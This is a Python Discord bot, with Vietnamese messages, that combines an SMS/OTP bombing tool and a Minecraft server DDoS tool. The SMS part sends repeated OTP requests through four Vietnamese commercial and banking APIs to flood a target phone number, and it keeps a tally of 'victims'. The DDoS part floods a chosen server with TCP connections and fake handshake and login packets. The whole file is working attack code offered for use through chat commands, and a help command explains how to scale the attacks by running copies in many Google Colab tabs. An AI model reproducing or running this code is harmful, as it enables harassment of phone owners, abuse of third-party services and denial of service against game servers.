#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DISCORD BOT TÍCH HỢP SPAM SMS + DDOS MINECRAFT
# LỆNH SMS: !spam !call !megaspam !stopspam !stats !apis
# LỆNH DDOS: !ddos !lag !stopddos !ddosstats !colab
# CHẠY TRÊN RENDER 24/7

import discord
from discord.ext import commands
import aiohttp
import asyncio
import random
import time
import json
import uuid
import os
import socket
import struct
import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask

# ============================================
# FLASK KEEP ALIVE
# ============================================
app = Flask(__name__)

@app.route('/')
def home():
    return "🔥 BOT SMS + DDOS ĐANG CHẠY"

@app.route('/ping')
def ping():
    return "🏓 Pong!"

def start_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

threading.Thread(target=start_web, daemon=True).start()

# ============================================
# TOKEN + INTENTS
# ============================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "TOKEN_VAO_DAY")
PREFIX = "!"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ============================================
# SPAM STATS
# ============================================
spam_stats = {
    "sms_sent": 0,
    "call_attempts": 0,
    "active_tasks": [],
    "victims": {}
}

# ============================================
# DDOS STATS
# ============================================
ddos_stats = {
    "active_attacks": [],
    "total_packets": 0,
    "total_connections": 0,
    "attack_count": 0
}

# ============================================
# SMS APIS (4 API SỐNG)
# ============================================
SMS_APIS = [
    {
        "name": "📱 Điện Máy Xanh",
        "url": "https://api.dienmayxanh.com/api/Account/SendOTP",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X)",
            "Origin": "https://dienmayxanh.com",
            "Referer": "https://dienmayxanh.com/"
        },
        "data": '{"phone":"{phone}","type":1,"channel":"SMS"}'
    },
    {
        "name": "🏦 VPBank",
        "url": "https://api.vpbank.com.vn/api/otp/send",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "🚕 MaiLinh",
        "url": "https://api.mailinh.vn/api/send-otp",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
    {
        "name": "🎵 Zing MP3",
        "url": "https://api.zingmp3.vn/api/otp/send",
        "headers": {"Content-Type": "application/json"},
        "data": '{"phone":"{phone}"}'
    },
]

# ============================================
# HÀM SPAM SMS
# ============================================
async def send_sms(phone, api_info, session):
    try:
        data_str = api_info["data"].replace("{phone}", phone)
        data = json.loads(data_str)
        data["_t"] = int(time.time() * 1000)
        
        async with session.post(api_info["url"], headers=api_info["headers"], json=data, timeout=5, ssl=False) as resp:
            if resp.status == 200:
                return True, api_info["name"]
    except:
        pass
    return False, api_info["name"]

async def spam_sms_worker(phone, count, delay, ctx, msg_id):
    global spam_stats
    connector = aiohttp.TCPConnector(limit=20, limit_per_host=5, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for i in range(count):
            tasks = []
            for api in SMS_APIS:
                tasks.append(send_sms(phone, api, session))
                tasks.append(send_sms(phone, api, session))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for success, name in results:
                if success:
                    spam_stats["sms_sent"] += 1
            
            if i % 5 == 0 and ctx and msg_id:
                try:
                    msg = await ctx.channel.fetch_message(msg_id)
                    embed = msg.embeds[0]
                    embed.set_field_at(4, name="💀 Tình Trạng", value=f"```ĐANG SPAM {phone}\nĐã bắn: {spam_stats['sms_sent']}/{count}\nTiến độ: {i}/{count}```", inline=False)
                    await msg.edit(embed=embed)
                except:
                    pass
            
            await asyncio.sleep(delay + random.uniform(0, 0.2))

# ============================================
# HÀM DDOS MINECRAFT
# ============================================
def encode_varint(value):
    result = bytearray()
    while value >= 0x80:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)

def create_handshake(host, port, protocol=759):
    try:
        host_bytes = host.encode('utf-8')
        data = bytearray()
        data.extend(encode_varint(protocol))
        data.extend(encode_varint(len(host_bytes)))
        data.extend(host_bytes)
        data.extend(struct.pack('>H', port))
        data.extend(encode_varint(2))
        
        packet = bytearray()
        packet.extend(encode_varint(len(data) + 1))
        packet.extend(encode_varint(0x00))
        packet.extend(data)
        return bytes(packet)
    except:
        return None

def create_login(username):
    try:
        user_bytes = username.encode('utf-8')
        offline_uuid = hashlib.md5(f"OfflinePlayer:{username}".encode()).digest()
        data = bytearray()
        data.extend(encode_varint(0x00))
        data.extend(encode_varint(len(user_bytes)))
        data.extend(user_bytes)
        data.append(0x01)
        data.extend(offline_uuid)
        packet = bytearray()
        packet.extend(encode_varint(len(data)))
        packet.extend(data)
        return bytes(packet)
    except:
        return None

def tcp_flood_worker(host, port, duration, stop_event, worker_id):
    global ddos_stats
    connections = []
    start_time = time.time()
    
    for i in range(60):
        if stop_event.is_set():
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((host, port))
            handshake = create_handshake(host, port)
            if handshake:
                sock.send(handshake)
                connections.append(sock)
                ddos_stats["total_connections"] += 1
        except:
            pass
    
    round_num = 0
    while not stop_event.is_set() and time.time() - start_time < duration:
        dead_conns = []
        for sock in connections:
            try:
                for _ in range(50):
                    login_pkt = create_login(f"DDOS_{worker_id}_{round_num}_{random.randint(0,999999)}")
                    if login_pkt:
                        sock.send(login_pkt)
                        ddos_stats["total_packets"] += 1
            except:
                dead_conns.append(sock)
        
        for dead in dead_conns:
            try:
                dead.close()
                connections.remove(dead)
            except:
                pass
            if not stop_event.is_set():
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(3)
                    new_sock.connect((host, port))
                    handshake = create_handshake(host, port)
                    if handshake:
                        new_sock.send(handshake)
                        connections.append(new_sock)
                except:
                    pass
        round_num += 1
    
    for sock in connections:
        try:
            sock.close()
        except:
            pass

# ============================================
# BOT EVENTS
# ============================================
@bot.event
async def on_ready():
    print(f"""
╔══════════════════════════════════════════════════════════╗
║   🔥 BOT SMS + DDOS ĐÃ SẴN SÀNG                        ║
║   TÊN: {bot.user.name}                                  ║
║   SMS: {len(SMS_APIS)} APIs | DDOS: 300 conns           ║
║   CHẠY TRÊN RENDER 24/7                                ║
╚══════════════════════════════════════════════════════════╝
    """)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"🔥 {PREFIX}helpme | SMS+DDOS"))

# ============================================
# LỆNH SPAM SMS
# ============================================
@bot.command(name="spam")
async def spam_cmd(ctx, phone: str = None, count: int = 100):
    if not phone or not phone.isdigit() or len(phone) < 10:
        await ctx.send("❌ `!spam <sdt> <số_lượng>`\nVD: `!spam 0987654321 100`")
        return
    if count > 500:
        count = 500
    
    embed = discord.Embed(title="💥 **SPAM SMS**", color=0xff0000, description=f"Bắn {count} SMS vào `{phone}`")
    embed.add_field(name="📱 Số", value=f"`{phone}`", inline=True)
    embed.add_field(name="💣 SL", value=f"`{count}`", inline=True)
    embed.add_field(name="🔫 APIs", value=f"`{len(SMS_APIS)}`", inline=True)
    embed.add_field(name="👤 Người dùng", value=ctx.author.mention, inline=True)
    embed.add_field(name="💀 Tình Trạng", value="```ĐANG SPAM...```", inline=False)
    
    msg = await ctx.send(embed=embed)
    task = asyncio.create_task(spam_sms_worker(phone, count, 0.3, ctx, msg.id))
    spam_stats["active_tasks"].append(task)
    
    start = time.time()
    while not task.done():
        await asyncio.sleep(3)
    elapsed = int(time.time() - start)
    
    if phone not in spam_stats["victims"]:
        spam_stats["victims"][phone] = 0
    spam_stats["victims"][phone] += count
    
    embed = discord.Embed(title="✅ **SPAM XONG!**", color=0x00ff00, description=f"Đã bắn {count} SMS vào `{phone}` trong {elapsed}s")
    embed.add_field(name="💦 Tổng", value=f"`{spam_stats['sms_sent']}`", inline=True)
    embed.add_field(name="🔥 Tốc độ", value=f"`{int(count/elapsed*60)}` SMS/phút", inline=True)
    await msg.edit(embed=embed)

@bot.command(name="stopspam")
async def stopspam_cmd(ctx):
    count = len(spam_stats["active_tasks"])
    for t in spam_stats["active_tasks"]:
        t.cancel()
    spam_stats["active_tasks"].clear()
    await ctx.send(f"🛑 Đã dừng {count} tác vụ spam!")

@bot.command(name="stats")
async def stats_cmd(ctx):
    embed = discord.Embed(title="📊 **THỐNG KÊ SPAM**", color=0x00ffff)
    embed.add_field(name="💥 SMS", value=f"`{spam_stats['sms_sent']}`", inline=True)
    embed.add_field(name="🎯 Nạn nhân", value=f"`{len(spam_stats['victims'])}`", inline=True)
    await ctx.send(embed=embed)

# ============================================
# LỆNH DDOS MINECRAFT
# ============================================
@bot.command(name="ddos")
async def ddos_cmd(ctx, host: str = None, port: int = 25565, duration: int = 120):
    if not host:
        await ctx.send("❌ `!ddos <ip> <port> <giây>`\nVD: `!ddos noobsmp.vn 25565 180`")
        return
    if duration > 300:
        duration = 300
    
    embed = discord.Embed(title="💣 **DDOS MINECRAFT**", color=0xff0000, description=f"ĐỊT MẸ `{host}:{port}` TRONG {duration}S!")
    embed.add_field(name="🎯 Mục tiêu", value=f"`{host}:{port}`", inline=True)
    embed.add_field(name="⏱️ Thời gian", value=f"`{duration}s`", inline=True)
    embed.add_field(name="👤 Người dùng", value=ctx.author.mention, inline=True)
    embed.add_field(name="💀 Trạng thái", value="```ĐANG TẤN CÔNG...```", inline=False)
    embed.set_footer(text="💀 DDOS BOT | Mở Colab để mạnh hơn")
    
    msg = await ctx.send(embed=embed)
    
    stop_event = threading.Event()
    ddos_stats["active_attacks"].append(stop_event)
    ddos_stats["attack_count"] += 1
    
    loop = asyncio.get_event_loop()
    start = time.time()
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        tasks = [loop.run_in_executor(executor, tcp_flood_worker, host, port, duration, stop_event, i) for i in range(5)]
        
        while time.time() - start < duration:
            if stop_event.is_set():
                break
            elapsed = int(time.time() - start)
            try:
                embed.set_field_at(3, name="💀 Trạng thái", value=f"```ĐANG ĐỊT {host}\n📦 Packets: {ddos_stats['total_packets']:,}\n🔌 Conns: {ddos_stats['total_connections']}\n⏱️ Còn: {duration-elapsed}s```", inline=False)
                await msg.edit(embed=embed)
            except:
                pass
            await asyncio.sleep(3)
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    elapsed = int(time.time() - start)
    embed = discord.Embed(title="✅ **DDOS XONG!**", color=0x00ff00, description=f"Đã địt `{host}:{port}` trong {elapsed}s!")
    embed.add_field(name="📦 Packets", value=f"`{ddos_stats['total_packets']:,}`", inline=True)
    embed.add_field(name="🔌 Conns", value=f"`{ddos_stats['total_connections']}`", inline=True)
    await msg.edit(embed=embed)
    
    if stop_event in ddos_stats["active_attacks"]:
        ddos_stats["active_attacks"].remove(stop_event)

@bot.command(name="lag")
async def lag_cmd(ctx, host: str = None, port: int = 25565):
    if not host:
        await ctx.send("❌ `!lag <ip> <port>`")
        return
    await ctx.invoke(ddos_cmd, host=host, port=port, duration=90)

@bot.command(name="stopddos")
async def stopddos_cmd(ctx):
    count = len(ddos_stats["active_attacks"])
    for ev in ddos_stats["active_attacks"]:
        ev.set()
    ddos_stats["active_attacks"].clear()
    await ctx.send(f"🛑 Đã dừng {count} cuộc DDoS!")

@bot.command(name="ddosstats")
async def ddosstats_cmd(ctx):
    embed = discord.Embed(title="📊 **THỐNG KÊ DDOS**", color=0x00ffff)
    embed.add_field(name="💣 Số lần", value=f"`{ddos_stats['attack_count']}`", inline=True)
    embed.add_field(name="📦 Packets", value=f"`{ddos_stats['total_packets']:,}`", inline=True)
    embed.add_field(name="🔌 Conns", value=f"`{ddos_stats['total_connections']}`", inline=True)
    embed.add_field(name="⚡ Đang chạy", value=f"`{len(ddos_stats['active_attacks'])}`", inline=True)
    await ctx.send(embed=embed)

@bot.command(name="colab")
async def colab_cmd(ctx):
    embed = discord.Embed(title="📘 **HƯỚNG DẪN MỞ COLAB**", color=0x0000ff, description="Mở Colab để DDoS mạnh hơn:")
    embed.add_field(name="1️⃣", value="Vào colab.research.google.com", inline=False)
    embed.add_field(name="2️⃣", value="Tạo notebook mới, paste code DDoS", inline=False)
    embed.add_field(name="3️⃣", value="Ctrl+Click tab để duplicate (mở 10-20 tab)", inline=False)
    embed.add_field(name="4️⃣", value="Run all trong mỗi tab", inline=False)
    embed.add_field(name="⚠️", value="Colab chạy 12h rồi ngắt, phải mở lại", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="helpme")
async def help_cmd(ctx):
    embed = discord.Embed(title="🤖 **HƯỚNG DẪN BOT**", color=0x0000ff, description="ĐỊT MẸ ĐỌC KỸ!")
    embed.add_field(name="💥 SMS", value="`!spam <sdt> <sl>` - Spam SMS\n`!stopspam` - Dừng\n`!stats` - Thống kê", inline=False)
    embed.add_field(name="💣 DDOS", value="`!ddos <ip> <port> <giây>` - DDoS\n`!lag <ip> <port>` - Lag nhanh\n`!stopddos` - Dừng\n`!ddosstats` - Thống kê\n`!colab` - Hướng dẫn mở rộng", inline=False)
    embed.set_footer(text="🔥 Bot SMS + DDOS | Render 24/7")
    await ctx.send(embed=embed)

# ============================================
# CHẠY BOT
# ============================================
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║   🔥 BOT SMS + DDOS MINECRAFT                          ║
║                                                        ║
║   SMS: !spam !stopspam !stats                          ║
║   DDOS: !ddos !lag !stopddos !ddosstats !colab         ║
║   HELP: !helpme                                        ║
╚══════════════════════════════════════════════════════════╝
    """)
    bot.run(BOT_TOKEN)
